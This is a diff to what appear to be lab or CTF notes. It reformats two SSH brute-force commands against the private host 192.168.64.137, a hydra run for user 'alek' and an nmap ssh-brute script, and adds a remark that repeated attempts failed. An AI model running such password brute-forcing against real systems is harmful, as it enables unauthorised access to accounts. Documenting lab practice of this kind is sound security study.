@@ -154,8 +154,11 @@ No success
 
 # Try brute forcing SSH with username alek
 
-hydra -l alek -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ssh://192.168.64.137 -V
+    hydra -l alek -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ssh://192.168.64.137 -V
+    
+    nmap -p 22 --script ssh-brute --script-args="userdb=/path/to/username_wordlist.txt,passdb=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" 192.168.64.137
 
-nmap -p 22 --script ssh-brute --script-args="userdb=/path/to/username_wordlist.txt,passdb=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" 192.168.64.137
+Ran multiple itereations on SSH brute forcing with no success on any.
 
+##
 
